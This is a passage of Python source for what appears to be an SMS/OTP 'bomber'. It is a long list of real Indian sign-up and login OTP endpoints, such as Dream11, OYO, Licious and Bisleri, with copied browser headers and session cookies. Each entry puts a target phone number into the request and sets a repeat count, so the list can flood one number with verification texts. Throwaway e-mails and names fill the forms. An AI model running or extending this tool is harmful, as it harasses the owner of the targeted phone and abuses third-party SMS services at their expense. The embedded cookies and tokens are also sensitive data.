hmIb01UnPtnTMD_7o4K79JzYgk4gFLBxjTZVyKvBhFpVhCcq7ePBWiO8LPDbaF6R7uSF8ZgrRunZbrEMrnLBqx6EKrdtJGgN2q8VFCDjNeQJH3CuYuOISzE_rPfc", "expected_action": "login"}),
        "count": 3
    },
    
    {
        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "dh_user_id=17cf6211-32d3-11ef-b821-53f25fac4eef; _scid=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _scid_r=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _fbp=fb.1.1719310489582.789493345356902452; _sctr=1%7C1719298800000; __csrf=6rcny4; _dd_s=rum=2&id=e35a5e56-45d2-4dbf-8678-20bc45cbb11c&created=1719310504672&expire=1719311451078",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "priority": "u=1, i",
            "referer": "https://www.dream11.com/register?redirectTo=%2F",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-device-identifier": "macos"
        },
        "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"}),
        "count": 1
    },
    
    {
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Cookie": "bp=lg; vxid=3a5a7d25605926fc8a9f938b4198d7f3; referral=https%253A%252F%252Fwww.google.com%252F; _ga=GA1.1.100588395.1719309875; WZRK_G=4e632d8f31c540b3aaf6c01c140a7e0e; _fbp=fb.1.1719309877848.406176085245910420; WZRK_S_4RW-KZK-995Z=%7B%22p%22%3A1%2C%22s%22%3A1719309880%2C%22t%22%3A1719309879%7D; _ga_45DD1K708L=GS1.1.1719309875.1.0.1719309885.0.0.0",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "language": "en",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "use-applinks": "true",
            "x-app-name": "WEB",
            "x-requested-with": "WEB"
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 5
    },
    
    {
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://bellavitaorganic.com",
            "priority": "u=1, i",
            "referer": "https://bellavitaorganic.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 10
    },
    
    {
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "text/plain;charset=UTF-8",
            "cookie": "_csrf=0L9ShP2N7kBoNgROXcXgrpzO; acc=IN; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DMH%2Ccity%3DMUMBAI%2Clat%3D18.98%2Clong%3D72.83%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D55836%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; mab=f14b44638c4c98b516a82db98baa1d6d; expd=mww2%3A1%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A1%7Cgmbr%3A1%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A1%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Clog2%3A0%7Clog2%3A0%7Cugce%3A0%7Cltvr%3A1%7Chwiz%3A0%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A0%7Cprwt%3A0%7Ccbhd%3A0%7Cins2%3A3%7Cmhdc%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Csovb%3A1%7Cqupi%3A0%7Cnbi1%3A3; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE%3D; _uid=Not%20logged%20in; XSRF-TOKEN=OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM; fingerprint2=8f2b46724e08bf3602b6c5f6745f8301; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.185019609.1719309292; _gid=GA1.2.1636583452.1719309292; _gcl_au=1.1.1556474320.1719309295; tvc_utm_source=google; tvc_utm_medium=organic; tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); rsd=true; _gat=1; _ga_589V9TZFMV=GS1.1.1719309291.1.1.1719309411.8.0.1086743157",
            "deviceid": "8f2b46724e08bf3602b6c5f6745f8301411649",
            "externalheaders": "[object Object]",
            "loc": "153",
            "origin": "https://www.oyorooms.com",
            "priority": "u=1, i",
            "referer": "https://www.oyorooms.com/login?country=&retUrl=/search%3Flocation%3DGonda%252C%2520Uttar%2520Pradesh%252C%2520India%26latitude%3D27.0374187%26longitude%3D81.95348149999995%26searchType%3Dlocality%26coupon%3D%26checkin%3D25%252F06%252F2024%26checkout%3D26%252F06%252F2024%26roomConfig%255B%255D%3D1%26showSearchElements%3Dfalse%26country%3Dindia%26guests%3D1%26rooms%3D1",
            "sdata": "eyJrdWQiOlsxODc0MDAsNTA3MDAsOTA3MDAsODMzMDAsNTkxMDAsNjg4MDAsMTE4MDAwLDg2NDAwLDExOTgwMCwxMjg2MDAsMTE0NDAwLDE5NTAwMCw4MTUwMCwxMTE4MDAsMTU5MzAwLDE0MjYwMCwxNDA5MDAsNzI1NDQ3MDAsNzI3Njg4MDAsNzMwMDgxMDAsNzMxOTI1MDAsNzMzODQzMDAsNzM2MDAxMDAsNzM4MDg1MDAsNzM5Njg0MDAsNzQxNzY3MDAsNzQ0MzIzMDAsNzkwMjQ0MDAsMjAwMDAwLDExOTkwMCw0Nzk5MDAsODE1OTAwLDEwMjQwMDAsMTQzOTcwMCwyMTk5NzAwLDI1NzU3MDAsMTE0NDAwLDI1NjIzMDAsMzUyMjEwMCwxODM3MDAsMTc1NTAwLDE1OTEwMCwxOTg5MDAsMTUxNzAwLDE1MTkwMCwxNTkyMDAsMTE5NzAwLDExOTMwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6W10sInRpZCI6W10sImtpZCI6Wzk5MTMxMDAsNDEyODAwLDE4MDMwMCwxNzM4MDAsODA0MDAsMTA3OTAwLDcyNzUyMDAsNzE4MDAsMTc2MDAwLDIzMjMwMCwxNjMwMCw2MzMwMDAsMjc1MDYwMCwxODQ1MDAsMjI0NzAwLDI1MDEwMCwyMzMwMCw4MDAzMDAsMjMyMjAwLDMwMzc3MDAsMTYwMDUwMCw2NDcwMCw4MDAsMjMyNDAwLDMwNDgwMCw0ODMwMCw0ODcwMCwzMjQwMCw1NTI2MDBdLCJ0bXYiOltdfQ==",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "xsrf-token": "OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
        "count": 2
    },
    
    {
        "url": "https://portal.myma.in/custom-api/auth/generateotp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://app.myma.in",
            "priority": "u=1, i",
            "referer": "https://app.myma.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"}),
        "count": 6
    },
    
    {
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "priority": "u=1, i",
            "referer": "https://www.jobhai.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-transaction-id": "JS-WEB-cb71a96e-c335-4947-a379-bf6ee24f9a3d"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 6
    },
    
    {
        "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone}),
        "count": 6
    },
    
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "source=website; _gid=GA1.2.1957294880.1719308075; WZRK_G=fd462bffc0674ad3bdf9f6b7c537c6c7; _gat=1; _gcl_au=1.1.1898387226.1719308076; ajs_anonymous_id=f59e4a4c-db21-44c5-b067-2c942debda44; location=eyJjaXBoZXJ0ZXh0IjoidWp4RnBDeXpKZU1UVHV2THJnbjZSNHZlRWRXTXRmQWhaUlJYakZJVlFFRHV1a3FkQnBwT2hTOEVwc1h4Q1ltTUJKSXozUWMxRHZUYnIvTE1LNU52VG1IVytBTEc0ZDR5dktnZ1B6MjRBWUxQK0ZzRGxScmJMTXo3MU85bDJXdStISDhuQmdYRkZ5eEdteU44VVBqbDFlTzV5dEQvY1NSQTZ1MitORzhIajZKZXJma093QjJ1a2tVeEJrYWtIQWRmaHE3d0E4Sm41cWtCQmNYNUZxUUk0S1RYVjZudHBXYTBPcEViVHkxMmVuNEZjUXAyb2ZzU2M4eTkvWTlvWnV4UFNFZ0x6M0tTMXlmc0ZBN25MUWZ6RG0rbkt1SE5sMVpLMDFkU0VXaHVPMmQxUlFZemJ3NzF4QWsveWNUSDBwS2JoaitUaEZJY1M0NFZLWmsrK3A4K0VSU2pqNDJ2RG5RZU05NVUrYVEzOFI2UUR4RWRDV3hubVdoL3oyRWg0ZFJyIiwiaXYiOiI1YzlmNjlmMGNmOGY3ZjgwMWU3ZTEzZWRkNzQ5MDVmNiIsInNhbHQiOiJjZGMzYTZkNTI5Nzc3MWJmN2UzODE1NDI1ZmQ1YzYwZWM2MDU2N2U0ZmRhMzQ5ODg1OTQxYTM0MTFhODBjNDgyOTdhZTA1M2Q1ZjcxOWJkMWQ0OTk0OGEwYTU0ZjYzYjE0YmQ0NDc5NTAyZWZjZWFlOGQyMDM3MDQ3NzM3NmI4NTQxOWVhYmJlZDc1YWVlMTY2NjE1NzM3MzRhYTUxOWJmY2ExZGIxYzQ2MmU1NzBmNzQ1NDIwM2JhZWFjYmNmOGQ5MTQ3OThjNDEwNjllYWJhM2ViY2Q5Y2E4OTUwMDJmOTQ2YTIyYjllZjE4ZGJkZWZjZTg0YTU0OGU3MWFkMTEwZDc4MmZjNDVhYjYxYzg4ZWY1ZmRkODM3NGE1ZTkxODg2N2NjZDc3ODA0MmQzYjUzMmFjMzVkMTVmYjU0NzQ3NmY1Njg0NjJmNmE2Y2I2MTQ2NjZjODU1ZThjOWI0ZWMyZGVlOTlmMTdiZDkxZjMwMDI1NGMyMTNjOGUzNTY4YTEyNjFhZGY4ZTYxMGZmYmIxZmZiODgzMDQ5OGIxNGMyYzk5NDI4ODY1MmYzZjcxOTExOWFiZTRjODQyZTk4MjAxNDlmOWJiZDU4ZTgzMmYyYWI3OTQzZWY3YThjYjc1NDFjZjIxZGUxM2FkOTQ0ZGRkZjdjOTk1MTlmYTk4ZGE0MiIsIml0ZXJhdGlvbnMiOjk5OX0=; _ga_YN0TX18PEE=GS1.1.1719308076.1.1.1719308104.0.0.0; _ga=GA1.1.2028763947.1719308075; nxt=eyJjaXBoZXJ0ZXh0IjoiUXB4VkE1a2swL0FQQzB4SytuUzdiSVNaUDJkOS8rNDNEb2orQktNTVdhST0iLCJpdiI6Ijk1NTBiZDY1NzYwYjYxNGU1MDZkZTEzZjk5ODFlZThkIiwic2FsdCI6ImVjYzQ0MTNjZTllOGJhNTA3OTJjYzhmZTMyZjc0NTQ1MzI5NTNhNmY5Mjg1NWU4MmMzMzA0MWZiODc1ZmQzNTIyZjcyMjllZTViNTRmY2Y5YTVjYzJlYThkMDFlNGJhOTA0NDA5OGYxMjVhMDIxYTUzYzY3ZDA2N2I0MjJhNDAwM2U3NGUxOGVlYTIzZGE5YTUyNmQyOTgzYTU5NTQ0MjlhMTRiOTAzZDJjY2RlNTIyNmI3ZmI3MjdjZmVkMTJkZGQ4OTgzMWQ4MTJjYWMxMTRhMjI1MmEwMjFjOWYxYTM2NzFhOTVkZmUxNjNhNjI4ZjYxYzg3MWI4ZWQzZTUzN2NjOGM1YTNlNjQzNDdlYjY5MzQ0MWU2YWZjYTkyODlkMTcxOGQ2ODI5ZTJkN2Y1MjhhNzQzNjY4OGRmMjFmZGJiNWEwYWM5NTYyODMyNTQ4NzJhOThmOWEyODA2ZDhjZmVmNWNkOTA2MmE0NDc3YjY0ODk3ZGQ1Y2RlNjEyZWFhOTdmMGI1MDEwNDE2MjRkNzUyNDg5NDIyYmE0MmQwMzFjZGI2NWU1NjA5NTQ3ZjA2ZGQ0MDVmNjZjM2VmYjIzZWFjOTk1MTM4MTEzZGE5ZTFkNjFkYWFmZDJlMDJlOWZkMGEzNDVmMDNiNjFhNzU5OTlmYTM3NmZjZjIwMTIwOTUwIiwiaXRlcmF0aW9ucyI6OTk5fQ==; WZRK_S_445-488-5W5Z=%7B%22p%22%3A3%2C%22s%22%3A1719308078%2C%22t%22%3A1719308110%7D",
            "origin": "https://www.licious.in",
            "priority": "u=1, i",
            "referer": "https://www.licious.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": ""
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3
    },
    
    {
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3",
            "origin": "https://superprofile.bio",
            "priority": "u=1, i",
            "referer": "https://superprofile.bio/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phoneNumber": phone, "countryCode": "+91", "data": {"email": "abcd2@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False}),
        "count": 1
    },
    
    {
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.bisleri.com",
            "priority": "u=1, i",
            "referer": "https://www.bisleri.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-requested-with": "7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu"
        },
        "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone}),
        "count": 20
    },
    
    {
        "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop", "device_name": "Chrome", "device_model": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "device_manufacture": "Windows", "device_release": "windows-10", "device_sdk_version": "126.0.0.0"}),
        "count": 3
    },
    
    {
        "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        "method": "POST",
        "headers": {
            "APP-TOKEN": "s16-q9fz-jy3p-rk",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwIiwiaXNzIjoiUXVpY2tSaWRlIiwiaWF0IjoxNTI2ODg2NzU1fQ.nsy3UbPnaANf7d3O0xAW3LTG1P-dgcEhgqwOey-IK2kFCGxr298jfLKkE2k6taTvzETpJMPpertJu3uzJDtDUQ",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "_ga_S6LZW9RD9Z=GS1.1.1719144863.1.0.1719144863.0.0.0; _ga=GA1.2.2033204632.1719144864; _gid=GA1.2.502724273.1719144864; _gat_gtag_UA_139055405_3=1; _gat_UA-139055405-3=1",
            "Origin": "https://pwa.getquickride.com",
            "Referer": "https://pwa.getquickride.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride&payload=&signature=&signatureAlgo=&domainName=pwa.getquickride.com",
        "count": 5
    },
    
    {
        "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=True&token",
        "method": "GET",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": 'comp_par="utm_campaign=70553\054firstclicktime=2024-06-23 17:18:10.351125\054utm_medium=ppc\054http_referer=https://www.google.com/\054utm_source=10001"; cr_id_last=None; last_source_time="2024-06-23 17:18:10.351039"; last_source=10001; nur=None; sessionid=2kp1dzotrgpe698bfanq4tp4qechv2ln; data_in_visits="10001&2024-06-23 17:18:10.350961\054"; csrftoken=UrmVVY4g3YmpffRV3Rdznqrq2kBLItpN; utm_campaign_last=70553; __cf_bm=HdXzeqlgG6io1sY6qie2eVJ74XMfXuLRNJIs.oTzbho-1719143290-1.0.1.1-Op8tdLoYJnUoaXpFfk927ZZafyzjr3qZ5z2ejJCkf8HmQTPzaaGR.erei72oVEdSsJx_1XTH1zQNpmsn9zLAig; _cfuvid=T_lLlwC6IEneinYAELiGdaxZlBaqKOZ8upanwvhyZiE-1719143290370-0.0.1.1-604800000; fw_utm={%22value%22:%22{%5C%22utm_source%5C%22:%5C%2210001%5C%22%2C%5C%22utm_medium%5C%22:%5C%22ppc%5C%22%2C%5C%22utm_campaign%5C%22:%5C%2270553%5C%22}%22%2C%22createTime%22:%222024-06-23T11:48:13.312Z%22}; fw_uid={%22value%22:%2292f5a144-b31b-4b24-96c6-d894804e5039%22%2C%22createTime%22:%222024-06-23T11:48:13.337Z%22}; fw_se={%22value%22:%22fws2.c48f4a93-0256-4df1-ae3f-2d33f47d61d6.1.1719143293468%22%2C%22createTime%22:%222024-06-23T11:48:13.468Z%22}; G_ENABLED_IDPS=google; _gid=GA1.2.767062449.1719143297; _gac_UA-62869587-1=1.1719143297.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _gcl_au=1.1.385881254.1719143298; _gcl_gs=2.1.k1$i1719143288; _gac_UA-62869587-2=1.1719143298.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _fbp=fb.1.1719143298995.264854070543037114; _ga_MF23YQ1Y0R=GS1.2.1719143300.1.0.1719143300.60.0.0; _ga=GA1.1.991595777.1719143297; _gcl_aw=GCL.1719143303.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _ga_TC6QEKJ4BS=GS1.1.1719143302.1.0.1719143302.60.0.0; _ga_ZMCTPTF5ZP=GS1.2.1719143304.1.0.1719143304.60.0.0; _clck=ggl1zg%7C2%7Cfmv%7C0%7C1635; _clsk=1iq7ave%7C1719143306731%7C1%7C1%7Cr.clarity.ms%2Fcollect; moe_uuid=b79017f8-6aad-4af9-b387-8dfef3749d3f',
            "priority": "u=1, i",
            "referer": "https://www.clovia.com/?utm_source=10001&utm_medium=ppc&utm_term=clovia_brand&utm_campaign=70553&gad_source=1&gclid=EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 5
    },
    
    {
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://kwikfixauto.in",
            "priority": "u=1, i",
            "referer": "https://kwikfixauto.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 3
    },
    
    {
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "authorization": "Bearer null",
            "brevi-channel": "DESKTOP_WEB",
            "brevi-channel-version": "40.0.0",
            "content-type": "application/json",
            "cookie": "WZRK_G=e35f2d1372894c078327721b0dce1643; PHPSESSID=t012m1s7ml0b1hrrt0clq063a0; _gcl_au=1.1.450954870.1719050061; _gid=GA1.2.2009705537.1719050079; _gat_UA-76491234-1=1; _ga_WRZEGYZRTW=GS1.1.1719050079.1.0.1719050079.0.0.1234332753; WZRK_S_R9Z-654-466Z=%7B%22p%22%3A2%2C%22s%22%3A1719050070%2C%22t%22%3A1719050079%7D; _clck=jleo6d%7C2%7Cfmu%7C0%7C1634; FPID=FPID2.2.as0IAmsiCa%2FP1407PbQfVL1Cc6nZ8u9zt2atD67UFIg%3D.1719050076; FPGSID=1.1719050080.1719050080.G-WRZEGYZRTW.SFwCEJeloGt9Yand3iX5MA; _fbp=fb.1.1719050080798.755777096366214429; FPLC=SlslklfyB3CaJY%2FHqIBvl5T3%2BI4dZHhl0NlWIJSwxvEmGnCsD4K%2Fechm2wpS0K3EgQCtOmHpqIBDQYTq5BsZTmC%2BDvjIVHjpREcazaWVfqimPEXJb5W63br788Qq2g%3D%3D; _clsk=1r9n9qk%7C1719050081944%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga=GA1.2.1921624223.1719050076; _ga_B5ZBCV939N=GS1.1.1719050079.1.0.1719050085.54.0.0",
            "origin": "https://www.brevistay.com",
            "priority": "u=1, i",
            "referer": "https://www.brevistay.com/login?red=/hotels-in-lucknow",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
